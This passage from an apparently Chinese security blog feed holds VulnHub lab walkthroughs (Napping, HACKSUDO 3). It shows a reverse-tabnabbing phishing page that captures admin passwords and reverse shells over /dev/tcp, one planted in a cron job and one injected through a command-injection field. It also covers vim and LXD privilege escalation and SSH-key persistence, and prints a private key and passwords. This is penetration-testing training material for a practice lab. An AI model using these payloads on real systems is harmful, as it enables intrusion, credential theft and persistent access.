端口，钓鱼管理员</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget http://192.168.31.170/index.php</span><br><span class=\"line\">cat index.php &amp;&amp; mv index.php index.html</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-020.png\" alt></p>\n<p>现在该站点表明该页面的管理员将查看我们的链接，管员看到的是我们伪造的和对方 index.html 一样的界面，管员有可能认为自己的账号被注销会重新输入账户密码，而由于这是我们构造的界面，对方输入的信息将会被我们所监听。</p>\n<p>evil.html 的作用是重定向，本来的网址是 http://192.168.31.135/evil.html 但是访问<br>\n的这个文件之后将被重定向为 http://192.168.31.135:4444/index.html</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat &gt; evil.html &lt;&lt;EOF</span><br><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">  &lt;title&gt;My Blog&lt;/title&gt;</span><br><span class=\"line\">&lt;/head&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">  &lt;script&gt;</span><br><span class=\"line\">    if(window.opener)</span><br><span class=\"line\">      window.opener.parent.location.replace(&#x27;http://192.168.31.135:4444/index.html&#x27;);</span><br><span class=\"line\">    if(window.opener != window)</span><br><span class=\"line\">      window.opener.parent.location.replace(&#x27;http://192.168.31.135:4444/index.html&#x27;);</span><br><span class=\"line\">  &lt;/script&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-021.png\" alt></p>\n<p>提交指向我们 evil.html 链接<br>\n然后点击链接<br>\n我们将转到我们的 evil.html<br>\n 但是原始标签将转到我们的 index.html，它看起来与登录页面完全相同<br>\n确保 Python 服务器在端口 80 和 4444 上运行</p>\n<ol start=\"5\">\n<li>钓鱼攻击，等待鱼儿上钩</li>\n</ol>\n<p>启动 80 端口的 http 服务: python3 -m http.server 80<br>\n 开启 80 服务后，对方可以访问到 http://192.168.31.135/evil.html 并且访问的这<br>\n个文件之后将被重定向为 http://192.168.31.135:4444/index.html</p>\n<p>-&gt; 我们从 4444 端口处监听以便捕捉到对方的用户名和密码！</p>\n<img data-src=\"/N1h1l157/VULNHUB/image-022.png\" width=\"580\" alt=\"Image\">\n<p><code>nc -lvvp 4444</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-023.png\" width=\"500\" alt=\"Image\">\n<p>-&gt; 获得管理员账户：daniel 密码：C@ughtm3napping<br>\n 注意这里的 %40 是 url 编码的 @</p>\n<h3 id=\"定时任务反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#定时任务反弹shell\">#</a> 定时任务反弹 shell</h3>\n<ol>\n<li>得到账号密码，可以登入服务器，ssh <span class=\"exturl\" data-url=\"bWFpbHRvOmRhbmllbEAxOTIuMTY4LjMxLjE3MA==\">daniel@192.168.31.170</span></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-024.png\" width=\"530\" alt=\"Image\">\n<ol start=\"2\">\n<li>观察 /home 文件，分析可提权的文件</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cat query.py</span><br><span class=\"line\">cat site_status.txt | head -n 10</span><br><span class=\"line\">tail -n 10 site_status.txt</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-025.png\" width=\"480\" alt=\"Image\">\n<p>对方有一个定时任务，用来检测网站是否正常，如果正常的话，会将日志打印出来，这里我们以 adrian 这个用户执行反弹该用户权限的 shell.</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">/dev/shm/是linux下一个非常有用的目录，因为这个目录不在硬盘上，而是在内存里。</span></span><br><span class=\"line\">cat &gt; /dev/shm/shell.sh &lt;&lt; EOF</span><br><span class=\"line\"><span class=\"meta prompt_\">#</span><span class=\"language-bash\">! /bin/bash</span></span><br><span class=\"line\">bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br><span class=\"line\">EOF</span><br><span class=\"line\">chmod +x /dev/shm/shell.sh</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-026.png\" width=\"500\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在query.py中添加此命令，用来执行反弹shell的命令：</span></span><br><span class=\"line\">cat &gt;&gt; query.py &lt;&lt; EOF</span><br><span class=\"line\">import os</span><br><span class=\"line\">os.system(&#x27;/usr/bin/bash /dev/shm/shell.sh&#x27;)</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-027.png\" width=\"400\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">监听 4444 端口，等待定时任务被执行，shell成功反弹出来</span></span><br><span class=\"line\">nc - lvvp 4444</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过下面的命令来把终端标准一点显示：</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; then press Ctrl+Z</span><br><span class=\"line\">stty raw -echo;fg then press ENTER twice</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-028.png\" width=\"550\" alt=\"Image\">\n<h3 id=\"vim-shell提权\"><a class=\"markdownIt-Anchor\" href=\"#vim-shell提权\">#</a> vim-shell 提权</h3>\n<p>列出用户权限或检查特定命令<br>\n <code>sudo -l</code> <br>\n 这里发现有可调用 root 执行无密码的 vim 命令</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-029.png\" alt></p>\n<p>提权超级丰富的网址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v\">https://gtfobins.github.io/</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">直接写一个 vim shell</span><br><span class=\"line\">sudo vim -c ‘:!/bin/sh’ 表示以root权限去写vim shell</span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-030.png\" width=\"550\" alt=\"Image\">\n<h3 id=\"篡改authorized_keys维权\"><a class=\"markdownIt-Anchor\" href=\"#篡改authorized_keys维权\">#</a> 篡改 authorized_keys 维权</h3>\n<p>靶机：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">给靶机打印公钥</span></span><br><span class=\"line\">echo &#x27;ssh-rsa</span><br><span class=\"line\">AAAAB3NzaC1yc2EAAAADAQABAAABgQCysSKgDq+5dEpirNHGl2j+ceqNRQHnSAHgQ3zsKqmUn9iyks</span><br><span class=\"line\">5L07z9Y34OEvUsYAxsFgdLtdD+MxufPPQwj8a77hmcqWguq5EmJUiZ7fA/peddvGR9Q5ypMpkuMFm2W2gIg</span><br><span class=\"line\">kVG+b4XPCQ0ydC9gn8ac7dReeMIykcD+vcQgpvHniK45rqAJJwbnb9MxNGDuPQHlSCSGA3FtHayNNsAmC</span><br><span class=\"line\">+ek1m2Qk3oVUF/8XGnjHvw2fMTog8h41Se8lYgHLDf8o4IibuOxxxpNVYOIgUZ0Ahvg9+srGvzquDS/yqXDf</span><br><span class=\"line\">06aBGHj+ISjOZ9wrB/Qmg3ArylKCaRk8UztsXg4gkCKiGiAynYY/EqNzXAuR42A1lby+kf9FUwSXGp8wdRG</span><br><span class=\"line\">YVc3yOWQm+lHy5Ov1RqdSCsMMYkyqAOV+2weoRki9iONN8h7YVWX9hBoVPpRiLKDfG3aLkjRVyPrpx</span><br><span class=\"line\">+qVHNo8rYHI9zjiTAhM/PJFarLhMEg+e3AvbEPBCN6p5lmO3lAdXX40= root@earth&#x27; &gt;&gt;</span><br><span class=\"line\">~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<p>攻击机：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">给攻击机打印私钥，注意私钥里边的第一行不能有空行</span></span><br><span class=\"line\">echo &#x27;</span><br><span class=\"line\">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class=\"line\">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn</span><br><span class=\"line\">NhAAAAAwEAAQAAAYEAsrEioA6vuXRKYqzRxpdo/nHqjUUB50gB4EN87CqplJ/YspLOS9O</span><br><span class=\"line\">/WN+DhL1LGAMbBYHS7XQ/jMbnzz0MI/Gu+4ZnKloLquRJiVIme3wP6XnXbxkfUOcqTKZLj</span><br><span class=\"line\">BZtltoCIJFRvm+FzwkNMnQvYJ/GnO3UXnjCMpHA/r3EIKbx54iuOa6gCScG52/TMTRg7j</span><br><span class=\"line\">B5UgkhgNxbR2sjTbAJgvnpNZtkJN6FVBf/Fxp4x78NnzE6IPIeNUnvJWIByw3/KOCIm7js</span><br><span class=\"line\">ccaTVWDiIFGdAIb4PfrKxr86rg0v8qlw3/dOmgRh4/iEozmfcKwf0JoNwK8pSgmkZPFM7b</span><br><span class=\"line\">F4OIJAiohogMp2GPxKjc1wLkeNgNZW8vpH/RVMElxqfMHURmFXN8jlkJvpR8uTr9UanUgr</span><br><span class=\"line\">DDGJMqgDlftsHqEZIvYjjTfIe2FVl/YQaFT6UYiyg3xt2i5I0Vcj66cfqlRzaPK2ByPc</span><br><span class=\"line\">kwITPzyRWqy4TBIPntwL2xDwQjeqeZZjt5QHV1+NAAAFgL9tgH2/bYB9AAAAB3NzaC1yc</span><br><span class=\"line\">EAAAGBALKxIqAOr7l0SmKs0caXaP5x6o1FAedIAeBDfOwqqZSf2LKSzkvTvP1jfg4S9Sxg</span><br><span class=\"line\">DGwWB0u10P4zG5889DCPxrvuGZypaC6rkSYlSJnt8D+l5128ZH1DnKkymS4wWbZbaAiCRU</span><br><span class=\"line\">b5vhc8JDTJ0L2Cfxpzt1F54wjKRwP69xCCm8eeIrjmuoAknBudv0zE0YO49AeVIJIYDcW</span><br><span class=\"line\">drI02wCYL56TWbZCTehVQX/xcaeMe/DZ8xOiDyHjVJ7yViAcsN/yjgiJu47HHGk1Vg4iBR</span><br><span class=\"line\">nQCG+D36ysa/Oq4NL/KpcN/3TpoEYeP4hKM5n3CsH9CaDcCvKUoJpGTxTO2xeDiCQIqIaI</span><br><span class=\"line\">DKdhj8So3NcC5HjYDWVvL6R/0VTBJcanzB1EZhVzfI5ZCb6UfLk6/VGp1IKwwxiTKoA5X</span><br><span class=\"line\">bB6hGSL2I403yHthVZf2EGhU+lGIsoN8bdouSNFXI+unH6pUc2jytgcj3OOJMCEz88kVqs</span><br><span class=\"line\">uEwSD57cC9sQ8EI3qnmWY7eUB1dfjQAAAAMBAAEAAAGBAJ6lZ5FlGJx1Y6lRt/kx6hSlfN</span><br><span class=\"line\">Gpp7P4GTpLkLh4dBCxDgoVDrUBqvPohjzmlees6rp3oEiWhpN5OpfY3Q/URmQJU5HkUcvF</span><br><span class=\"line\">pNuSFHAdcMSBffWZ0jnocklB0//PC4c8hhOv3OPTzPICAj8fwoTOPBx3ChV7OpdOR1iAUy</span><br><span class=\"line\">PEYZwLiNZSethUKIjYN8RnpX/mEDo/Kyip1Ghn/U3gYWOYugZ22hpXqaWRM9LswLQ5pLxE</span><br><span class=\"line\">NGyE4Bx9IV7w1ogyENLzG60Eycb80YF7UX1a3wwT1MmhdXTHe23mPZ0NAS0vXgX/Z5za7Y</span><br><span class=\"line\">mZhSvWyEY9OSuscnQMARLD07y8lmCiMvdpy/u7mEM9xq+qy/1RpAi+b1xFifZPjvTSKPpz</span><br><span class=\"line\">+UXrQXhInPY20mUX6UtJtzK6uH4wbfhewSaBG/QKCTJwmqWWuGOO/juBfdrESvBkrRXRrX</span><br><span class=\"line\">XjKnGo1/3KCYegY6lnLZdYIFGLchDQSsoAcRojLSarMDR/GS2p4UJqU2eGLlGDG+4PfQAA</span><br><span class=\"line\">AMASNt36l5t/f9gR/6qD+WVARaYc8EvlczrR6TiWNGd0UUti31Px9PKFETku/hWcHLjlRS</span><br><span class=\"line\">BJxxMm0uMbBgh+oiOHlIcJz5PRuKHzC48kn/n8YcPs7C00UiR4JuQzxMQuJPXYntaks/YU</span><br><span class=\"line\">nH30fGkrBY14Db4MEF2WEIYCGbbD6FROxVoA39oXAeMRtC9VTbhgc5WiGjW8kadZgAyEvn</span><br><span class=\"line\">krfRtv9hDn1pyquiS7L8bAI+klJgulyuO8beLsNX0oMkw+RbAAAADBANxEmaC8oVnD8pRL</span><br><span class=\"line\">JfTzIIg7OI9g1gXPrT/ZlMgfxxlfQiWdQqoqmQfX4EthskAVwS3n9n7h4E5/4IOU+aLmn+</span><br><span class=\"line\">mrsx6aZhwVeF3bHLRfQmRqf6WBc58upcUrZqWPQ5hZfBzpDZFddixjhS0FU3rDlrEJJ9WL</span><br><span class=\"line\">R2D/q769sgV4dAXerLW643w3IKJA3liRQpBLrmcUHeN0VCbVfBVfrfz3lWN8vcikX2cSj</span><br><span class=\"line\">Vhp4jiMkroUJhEMm90N0rnAG/VfXiEXwAAAMEAz63xywZopECaqv8LSXlOAbLpNyKj/TQ</span><br><span class=\"line\">1XCOW9N3/DxE7swiSQmP35aoj3D2BmaaBIfTI+Jgxaoq8GUI/tSpgVVTVxQAHTByorVWLn</span><br><span class=\"line\">yDxM27xB4+20KVa8+LUbe7t3tK40cbzo6i4+0TCyM2M0Oxq2242c8jv1A9gMuSLT3B4Wj</span><br><span class=\"line\">fXSe1ypztVEyPr0LnB9khH9nyLe9IhChYAG6mPW31I0dnrtmy2UdMkOwscMuqKwpevijY</span><br><span class=\"line\">PJaNWLEHEcEcOTAAAACnJvb3RAZWFydGg=</span><br><span class=\"line\">-----END OPENSSH PRIVATE KEY-----</span><br><span class=\"line\">&#x27; &gt;&gt; ~/.ssh/vulnhub</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-031.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用ssh私钥登录</span></span><br><span class=\"line\">chmod 700 ~/.ssh/vulnhub</span><br><span class=\"line\">ssh root@192.168.31.170 -i ~/.ssh/vulnhub</span><br></pre></td></tr></table></figure>\n<p>-&gt; 成功登陆到了对方服务器</p>\n",
            "tags": [
                "VULNHUB 1-10"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2021/11/01/VULNHUB/103%20HACKSUDO/",
            "url": "http://www.n1h1l157.live/2021/11/01/VULNHUB/103%20HACKSUDO/",
            "title": "VULNHUB 3 HACKSUDO",
            "date_published": "2021-10-31T16:00:00.000Z",
            "content_html": "<p>靶机下载地址：<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvaGFja3N1ZG8tMyw2NzEv\">https://www.vulnhub.com/entry/hacksudo-3,671/</span></p>\n<h3 id=\"确认攻击目标\"><a class=\"markdownIt-Anchor\" href=\"#确认攻击目标\">#</a> 确认攻击目标</h3>\n<p>攻击机 KALI： 192.168.31.135<br>\n 靶机 HACKSUDO：桥接于 1 92.168.31.1 的网卡，ip 未知</p>\n<ol>\n<li>通过 netdiscover 扫描当前网卡里边有哪些机器<br>\n <code>sudo netdiscover -i eth0 -r 192.168.31.0/24</code></li>\n</ol>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-032.png\" alt></p>\n<ol start=\"2\">\n<li>将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">shell</span></span><br><span class=\"line\">cat &gt; myip.txt &lt;&lt; EOF</span><br><span class=\"line\">192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33</span><br><span class=\"line\">192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP<br>\n <code>sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-033.png\" width=\"550\" alt=\"Image\">\n<p>-&gt; 目标机器的 ip 地址： 192.168.31.141</p>\n<h3 id=\"端口扫描\"><a class=\"markdownIt-Anchor\" href=\"#端口扫描\">#</a> 端口扫描</h3>\n<p><code>sudo nmap -A -p 1-1024 192.168.31.141 - oN /tmp/hacksudo.txt</code></p>\n<img data-src=\"/N1h1l157/VULNHUB/image-034.png\" width=\"580\" alt=\"Image\">\n<h3 id=\"目录爆破并反弹shell\"><a class=\"markdownIt-Anchor\" href=\"#目录爆破并反弹shell\">#</a> 目录爆破并反弹 shell</h3>\n<p>打开网站：<span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQx\">http://192.168.31.141</span></p>\n<ol>\n<li>对此网站进行目录扫描<br>\n <code>dirsearch -u http://192.168.31.141</code></li>\n</ol>\n<img data-src=\"/N1h1l157/VULNHUB/image-035.png\" width=\"350\" alt=\"Image\">\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQxL2xvZ2luLnBocA==\">http://192.168.31.141/login.php</span> 尝试弱口令，万能密码均失败</p>\n<ol start=\"2\">\n<li>加载比较全面一点的字典，来扩大目录，看是否能得到更多的信息</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gobuster dir -u http://192.168.31.141 -x php,txt,html,bak,zip -w</span><br><span class=\"line\">/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-036.png\" width=\"570\" alt=\"Image\">\n<p>-&gt; <span class=\"exturl\" data-url=\"aHR0cDovLzE5Mi4xNjguMzEuMTQxL2dlbmVyYXRvci5waHAj\">http://192.168.31.141/generator.php#</span> 存在 REC 代码执行漏洞</p>\n<ol start=\"3\">\n<li>对 http://192.168.31.141/generator.php# 网站进行攻击</li>\n</ol>\n<p>疑似 figlet xx 的命令，构造 figlet xx&amp;ls 可执行更多的 linux 命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在此位置输入反弹shell的命令，并监听端口</span></span><br><span class=\"line\">nc lvvp 4444</span><br><span class=\"line\">1 &amp; bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.31.135/4444 0&gt;&amp;1&#x27;</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-037.png\" width=\"500\" alt=\"Image\">\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使终端窗口变为一个标准的终端</span></span><br><span class=\"line\">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27; - &gt; ctrl+z</span><br><span class=\"line\">stty raw -echo;fg -&gt; enter,enter</span><br><span class=\"line\">export TERM=xterm</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-038.png\" width=\"570\" alt=\"Image\">\n<h3 id=\"凯撒加密\"><a class=\"markdownIt-Anchor\" href=\"#凯撒加密\">#</a> 凯撒加密</h3>\n<p>翻阅文件，这里找到一个类似于 “凯撒加密” 的文件</p>\n<p>提示：凯撒密码是一种位移加密方式，只对 26 个字母进行位移替换加密，规则简单。例如，当偏移量是 2 的时候，所有的字母 A 将被替换成 C，B 变成 D，以此类推。如果您输入的是中英文组合，则只会对英文加密解密</p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-039.png\" alt></p>\n<p>在线进行凯撒解密，偏移为 13 ：<span class=\"exturl\" data-url=\"aHR0cDovL21vZXJzaW1hLjAwY2hhLm5ldC9rYWlzYW1pbWEuYXNw\">http://moersima.00cha.net/kaisamima.asp</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-040.png\" alt></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">解密后的数据为：</span></span><br><span class=\"line\">hacksudo locker SSH username:hacksudo</span><br><span class=\"line\">password:63c9142792d571d0f7c28eb30626d6f38792a2e7679b76d784231676d62 447fb80af8953745f709c6622dda2cb4d754c262d0d31b3030a08f7b524079a6b336b</span><br></pre></td></tr></table></figure>\n<h3 id=\"sha-512加密\"><a class=\"markdownIt-Anchor\" href=\"#sha-512加密\">#</a> SHA 512 加密</h3>\n<p>密码又被进行了一层 hash 散列加密<br>\n在线 hash 解密：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jcmFja3N0YXRpb24ubmV0Lw==\">https://crackstation.net/</span></p>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-041.png\" alt></p>\n<p>-&gt; 得到 hacksudo 的用户名：hacksudo 密码：vishal</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">登陆到此用户</span></span><br><span class=\"line\">su hacksudo </span><br></pre></td></tr></table></figure>\n<p><img data-src=\"/N1h1l157/VULNHUB/image-042.png\" alt></p>\n<h3 id=\"lxd-提权\"><a class=\"markdownIt-Anchor\" href=\"#lxd-提权\">#</a> LXD 提权</h3>\n<p>发现了 id 之后有 lxd 补充组，尝试 lxd 提权<br>\n lxd 提权指南：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ib29rLmhhY2t0cmlja3MueHl6L2xpbnV4LXVuaXgvcHJpdmlsZWdlLWVzY2FsYXRpb24vaW50ZXJlc3RpbmctZ3JvdXBzLWxpbnV4LXBlL2x4ZC1wcml2aWxlZ2UtZXNjYWxhdGlvbg==\">https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">在kali机器上下载lxd的文件，并通过scp发送至靶机：</span></span><br><span class=\"line\">wget https://github.com/saghul/lxd-alpine-builder/archive/refs/heads/master.zip</span><br><span class=\"line\">scp -r parallels@192.168.31.135:~/Desktop/tool/lxd/lxd /tmp/lxd</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">自定义镜像</span></span><br><span class=\"line\">sed -i &#x27;s,yaml_path=&quot;latest-stable/releases/$apk_arch/latest-</span><br><span class=\"line\">releases.yaml&quot;,yaml_path=&quot;v3.8/releases/$apk_arch/latest-releases.yaml&quot;,&#x27; build-</span><br><span class=\"line\">alpine</span><br><span class=\"line\">sudo ./build-alpine -a i</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">引入镜像</span></span><br><span class=\"line\">lxc image import alpine*.tar.gz --alias myimage</span><br><span class=\"line\">lxd init</span><br><span class=\"line\">lxc init myimage mycontainer -c security.privileged=true</span><br><span class=\"line\">lxc config device add mycontainer mydevice disk source=/ path=/mnt/root</span><br><span class=\"line\">recursive=true</span><br><span class=\"line\">lxc start mycontainer</span><br><span class=\"line\">lxc exec mycontainer /bin/sh</span><br></pre></td></tr></table></figure>\n<img data-src=\"/N1h1l157/VULNHUB/image-044.png\" width=\"430\" alt=\"Image\">\n<h3 id=\"配置ssh-keygen维权\"><a class=\"markdownIt-Anchor\" href=\"#配置ssh-keygen维权\">#</a> 配置 ssh-keygen 维权</h3>\n<ol>\n<li>服务器操作</li>\n</ol>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">生成私钥和公钥：</span></span><br><span class=\"line\">ssh-keygen -t rsa</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">保存公钥至认证文件：</span></span><br><span class=\"line\">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>\n<ol 